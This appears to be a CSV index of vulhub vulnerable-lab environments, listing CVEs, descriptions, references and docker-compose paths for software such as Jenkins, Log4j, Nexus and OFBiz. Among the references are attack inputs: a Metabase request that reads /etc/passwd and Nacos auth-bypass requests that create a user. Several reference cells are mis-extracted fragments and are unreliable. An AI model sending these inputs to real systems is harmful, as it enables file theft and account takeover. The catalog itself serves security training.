Name,CVE,Description,References,Path,Type,Startup,Vector
jenkins,CVE-2018-1000861,Jenkins Remote Code Execution (CVE-2018-1000861),"http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861,docker-compose,docker compose up,remote
jenkins,CVE-2017-1000353,Jenkins Remote Code Execution (CVE-2017-1000353),"https://www.jenkins.io/security/advisory/2017-04-26/
https://www.exploit-db.com/exploits/41965
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353,docker-compose,docker compose up,remote
jetty,CVE-2021-28164,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164,docker-compose,docker compose up,remote
jetty,CVE-2021-34429,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-34429,docker-compose,docker compose up,remote
jetty,CVE-2021-28169,Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169),https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq,https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169,docker-compose,docker compose up,remote
jimureport,CVE-2023-4450,JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450),"https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
https://whoopsunix.com/docs/java/named%20module/
https://www.reajason.eu.org/writing/freemarkersstimemshell/",https://github.com/vulhub/vulhub/tree/master/jimureport/CVE-2023-4450,docker-compose,docker compose up,remote
jira,CVE-2019-11581,Atlassian Jira Template Injection (CVE-2019-11581),"https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
https://jira.atlassian.com/browse/JRASERVER-69532
https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw",https://github.com/vulhub/vulhub/tree/master/jira/CVE-2019-11581,docker-compose,docker compose up,remote
jmeter,CVE-2018-1297,Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297),,https://github.com/vulhub/vulhub/tree/master/jmeter/CVE-2018-1297,docker-compose,docker compose up,remote
joomla,CVE-2015-8562,Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562),"https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html
https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562,docker-compose,docker compose up,remote
joomla,CVE-2017-8917,Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917),"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917,docker-compose,docker compose up,remote
joomla,CVE-2023-23752,Joomla improper access check in webservice endpoints (CVE-2023-23752),"https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
https://xz.aliyun.com/t/12175
https://vulncheck.com/blog/joomla-for-rce",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2023-23752,docker-compose,docker compose up,remote
jumpserver,CVE-2023-42820,Jumpserver random seed leakage and account takeover (CVE-2023-42820),"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw
https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html
http://localhost:8080",https://github.com/vulhub/vulhub/tree/master/jumpserver/CVE-2023-42820,docker-compose,docker compose up,remote
jupyter,Unknown,Jupyter Notebook Unauthorized Access,,unknown,docker-compose,docker compose up,remote
kafka,CVE-2023-25194,Apache Kafka Clients JNDI injection RCE (CVE-2023-25194),"https://nvd.nist.gov/vuln/detail/CVE-2023-25194
https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml
https://hackerone.com/reports/1529790",https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194,docker-compose,docker compose up,remote
kibana,CVE-2019-7609,Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609),"https://nvd.nist.gov/vuln/detail/CVE-2019-7609
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
https://slides.com/securitymb/prototype-pollution-in-kibana/#/4",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2019-7609,docker-compose,docker compose up,remote
kibana,CVE-2020-7012,Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012),"https://hackerone.com/reports/852613
https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2020-7012,docker-compose,docker compose up,remote
kibana,CVE-2018-17246,Kibana Local File Inclusion (CVE-2018-17246),"https://nvd.nist.gov/vuln/detail/CVE-2018-17246
https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246,docker-compose,docker compose up,remote
kkfileview,Unknown,kkFileView ZipSlip Remote Code Execution,https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC,unknown,docker-compose,docker compose up,remote
langflow,CVE-2025-3248,Langflow validate/code API Pre-Auth Remote Code Execution (CVE-2025-3248),"https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
https://github.com/langflow-ai/langflow/releases/tag/1.3.0
https://github.com/langflow-ai/langflow/pull/6911",https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2025-3248,docker-compose,docker compose up,remote
laravel,CVE-2021-3129,Laravel Ignition 2.5.1 Remote Code Execution (CVE-2021-3129),"https://www.ambionics.io/blog/laravel-debug-rce
https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g",https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129,docker-compose,docker compose up,remote
librsvg,CVE-2023-38633,Librsvg XInclude Arbitrary file reading (CVE-2023-38633),"https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/
https://gitlab.gnome.org/GNOME/librsvg/-/issues/996",https://github.com/vulhub/vulhub/tree/master/librsvg/CVE-2023-38633,docker-compose,docker compose up,remote
libssh,CVE-2018-10933,libssh Authentication Bypass Vulnerability(CVE-2018-10933),"https://www.libssh.org/security/advisories/CVE-2018-10933.txt
https://www.seebug.org/vuldb/ssvid-97614
https://www.seebug.org/vuldb/ssvid-97614,",https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933,docker-compose,docker compose up,remote
liferay-portal,CVE-2020-7961,Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961),"https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
https://xz.aliyun.com/t/7499
https://xz.aliyun.com/t/7485
http://evil/",https://github.com/vulhub/vulhub/tree/master/liferay-portal/CVE-2020-7961,docker-compose,docker compose up,remote
log4j,CVE-2017-5645,Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645),"https://issues.apache.org/jira/browse/LOG4J2-1863
https://github.com/pimps/CVE-2017-5645",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2017-5645,docker-compose,docker compose up,remote
log4j,CVE-2021-44228,Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228),"https://logging.apache.org/log4j/2.x/security.html
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://xz.aliyun.com/t/10649",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228,docker-compose,docker compose up,remote
magento,Unknown,Magento 2.2 SQL Injection,"https://www.ambionics.io/blog/magento-sqli
https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html",unknown,docker-compose,docker compose up,remote
metabase,CVE-2023-38646,Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646),"https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2023-38646,docker-compose,docker compose up,remote
metabase,CVE-2021-41277,Metabase Pre-Auth Local File Inclusion (CVE-2021-41277),"https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
https://github.com/tahtaciburak/CVE-2021-41277
http://your-ip:3000/api/geojson?url=file:////etc/passwd",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2021-41277,docker-compose,docker compose up,remote
metersphere,Unknown,MeterSphere Plugin Endpoint Remote Code Execution,"https://xz.aliyun.com/t/10772
https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0",unknown,docker-compose,docker compose up,remote
metersphere,CVE-2021-45788,MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788),https://github.com/metersphere/metersphere/issues/8651,https://github.com/vulhub/vulhub/tree/master/metersphere/CVE-2021-45788,docker-compose,docker compose up,remote
mini_httpd,CVE-2018-18778,ACME mini_httpd Arbitrary File Read (CVE-2018-18778),"https://nvd.nist.gov/vuln/detail/CVE-2018-18778
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml",https://github.com/vulhub/vulhub/tree/master/mini_httpd/CVE-2018-18778,docker-compose,docker compose up,remote
minio,CVE-2023-28432,MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432),"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ",https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432,docker-compose,docker compose up,remote
mojarra,Unknown,Mojarra JSF ViewState Deserialization Vulnerability,"https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
https://www.exploit-db.com/docs/48126
https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf",unknown,docker-compose,docker compose up,remote
mongo-express,CVE-2019-10758,Mongo Express Remote Code Execution (CVE-2019-10758),,https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758,docker-compose,docker compose up,remote
mysql,CVE-2012-2122,MySQL Authentication Bypass (CVE-2012-2122),"http://www.freebuf.com/vuls/3815.html
https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/",https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122,docker-compose,docker compose up,remote
nacos,CVE-2021-29442,Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442),"https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
https://github.com/alibaba/nacos/issues/4463
https://github.com/ayoundzw/nacos-poc
http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
http://your-ip:8848",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29442,docker-compose,docker compose up,remote
nacos,CVE-2021-29441,Nacos Authentication Bypass(CVE-2021-29441),"https://github.com/advisories/GHSA-36hp-jr8h-556f
http://target:8848
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441,docker-compose,docker compose up,remote
neo4j,CVE-2021-34371,Neo4j Shell Server setSessionVariable Deserialization (CVE-2021-34371),"https://www.exploit-db.com/exploits/50170
https://github.com/mozilla/rhino/issues/520",https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371,docker-compose,docker compose up,remote
next.js,CVE-2025-29927,Next.js Middleware Authorization Bypass (CVE-2025-29927),"https://github.com/advisories/GHSA-f82v-jwr5-mffw
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
https://nvd.nist.gov/vuln/detail/CVE-2025-29927
http://your-ip:3000
http://your-ip:3000",https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927,docker-compose,docker compose up,remote
nexus,CVE-2024-4956,Nexus Repository Manager 3 Unauthenticated Path Traversal (CVE-2024-4956),https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16,https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2024-4956,docker-compose,docker compose up,remote
nexus,CVE-2019-7238,Nexus Repository Manager 3 Unauthenticated Remote Code Execution (CVE-2019-7238),"https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019
https://xz.aliyun.com/t/4136
https://www.anquanke.com/post/id/171116
http://commons.apache.org/proper/commons-jexl/",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238,docker-compose,docker compose up,remote
nexus,CVE-2020-10204,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10204),"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md
https://github.com/jas502n/CVE-2020-10199
http://192.168.1.3:8081
http://192.168.1.3:8081/
https://github.com/jas502n/CVE-2020-10199",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204,docker-compose,docker compose up,remote
nexus,CVE-2020-10199,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10199),"https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10199/README.md
https://github.com/jas502n/CVE-2020-10199
http://127.0.0.1:8081
http://127.0.0.1:8081/
https://github.com/jas502n/CVE-2020-10199",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199,docker-compose,docker compose up,remote
nginx,CVE-2013-4547,Nginx Filename Logic Vulnerability (CVE-2013-4547),"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547
https://blog.werner.wiki/file-resolution-vulnerability-nginx/
http://www.91ri.org/9064.html",https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547,docker-compose,docker compose up,remote
nginx,Unknown,Nginx Misconfiguration Vulnerabilities,https://$host$uri;,unknown,docker-compose,docker compose up,remote
nginx,Unknown,Nginx Parsing Vulnerability,,unknown,docker-compose,docker compose up,remote
nginx,CVE-2017-7529,Nginx Cache Leak by Integer Overflow (CVE-2017-7529),"https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7
http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
http://your-ip:8080/`",https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529,docker-compose,docker compose up,remote
node,CVE-2017-14849,Node.js 8.5.0 Path Traversal (CVE-2017-14849),"https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/
https://security.tencent.com/index.php/blog/msg/121",https://github.com/vulhub/vulhub/tree/master/node/CVE-2017-14849,docker-compose,docker compose up,remote
node,CVE-2017-16082,Node-Postgres Remote Code Execution (CVE-2017-16082),"https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
https://zhuanlan.zhihu.com/p/28575189",https://github.com/vulhub/vulhub/tree/master/node/CVE-2017-16082,docker-compose,docker compose up,remote
ntopng,CVE-2021-28073,ntopng Authentication Bypass (CVE-2021-28073),"http://noahblog.360.cn/ntopng-multiple-vulnerabilities/
http://your-ip:3000/
http://your-ip:3000/",https://github.com/vulhub/vulhub/tree/master/ntopng/CVE-2021-28073,docker-compose,docker compose up,remote
ofbiz,CVE-2024-38856,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-38856),"https://github.com/apache/ofbiz-framework/commit/31d8d7
https://forum.butian.net/article/524
https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-38856,docker-compose,docker compose up,remote
ofbiz,CVE-2023-49070,Unsafe deserialization of XMLRPC arguments in Apache OFBiz (CVE-2023-49070),"https://www.openwall.com/lists/oss-security/2023/12/04/2
https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-49070,docker-compose,docker compose up,remote
ofbiz,CVE-2023-51467,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2023-51467),"https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa
https://xz.aliyun.com/t/13211
https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-51467,docker-compose,docker compose up,remote
ofbiz,CVE-2020-9496,Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496),"https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz
https://github.com/dwisiswant0/CVE-2020-9496
https://www.cnblogs.com/ph4nt0mer/p/13576739.html",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496,docker-compose,docker compose up,remote
ofbiz,CVE-2024-45195,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-45195),"https://github.com/apache/ofbiz-framework/commit/ab78769c2d
https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa
https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45195,docker-compose,docker compose up,remote
ofbiz,CVE-2024-45507,Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507),"https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
https://xz.aliyun.com/t/15569
https://paper.seebug.org/3228/
http://ofbiz.apache.org/dtds/widget-screen.xsd"">",https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45507,docker-compose,docker compose up,remote
openfire,CVE-2023-32315,Openfire Admin Console Authentication Bypass (CVE-2023-32315),"https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w",https://github.com/vulhub/vulhub/tree/master/openfire/CVE-2023-32315,docker-compose,docker compose up,remote
opensmtpd,CVE-2020-7247,OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247),"https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
https://www.exploit-db.com/exploits/47984
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
https://www.anquanke.com/post/id/197689",https://github.com/vulhub/vulhub/tree/master/opensmtpd/CVE-2020-7247,docker-compose,docker compose up,remote
openssh,CVE-2018-15473,OpenSSH Username Enumeration (CVE-2018-15473),"http://openwall.com/lists/oss-security/2018/08/15/5
https://github.com/Rhynorater/CVE-2018-15473-Exploit
https://www.anquanke.com/post/id/157607",https://github.com/vulhub/vulhub/tree/master/openssh/CVE-2018-15473,docker-compose,docker compose up,remote
openssl,CVE-2014-0160,OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160),"https://heartbleed.com/
https://filippo.io/Heartbleed",https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160,docker-compose,docker compose up,remote
openssl,CVE-2022-0778,OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778),"https://github.com/drago-96/CVE-2022-0778
https://www.cnblogs.com/logchen/p/16030515.html
https://catbro666.github.io/posts/83951100/
https://github.com/yywing/cve-2022-0778
https://host.docker.internal:12345",https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2022-0778,docker-compose,docker compose up,remote
openssl,Unknown,"This page moved to CVE-2014-0160
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
opentsdb,CVE-2023-25826,OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）,"https://www.synopsys.com/blogs/software-security/opentsdb/
https://github.com/OpenTSDB/opentsdb/pull/2275",https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2023-25826,docker-compose,docker compose up,remote
opentsdb,CVE-2020-35476,OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476),"https://github.com/OpenTSDB/opentsdb/issues/2051
https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html",https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2020-35476,docker-compose,docker compose up,remote
